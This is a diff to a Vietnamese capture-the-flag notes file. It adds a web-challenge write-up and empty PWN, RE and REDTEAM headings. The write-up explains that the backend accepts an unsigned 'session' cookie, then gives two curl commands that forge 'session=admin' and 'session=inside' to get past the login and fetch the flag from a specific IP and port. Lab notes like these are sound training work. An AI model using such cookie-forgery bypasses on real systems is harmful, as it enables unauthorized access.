@@ -30,3 +30,17 @@ Quy trình tái dùng: kiểm kê artefact/ZIP nhưng không chạy mẫu, expor
 ```
 
 ## WEB
+
+```text
+Phân tích source cho thấy backend chỉ kiểm tra giá trị cookie `session` và không bắt buộc chữ ký khi nhận, nên có thể giả mạo `session=admin` để vượt đăng nhập, gọi `/api/gate/enter` đổi trạng thái thành `inside`, rồi gọi `/api/flag` lấy flag bằng lệnh: `curl --noproxy "*" -s -X POST -H "Cookie: session=admin" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/gate/enter; curl --noproxy "*" -s -X POST -H "Cookie: session=inside" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/flag`
+
+==
+
+```
+
+## PWN
+
+
+## RE
+
+## REDTEAM 
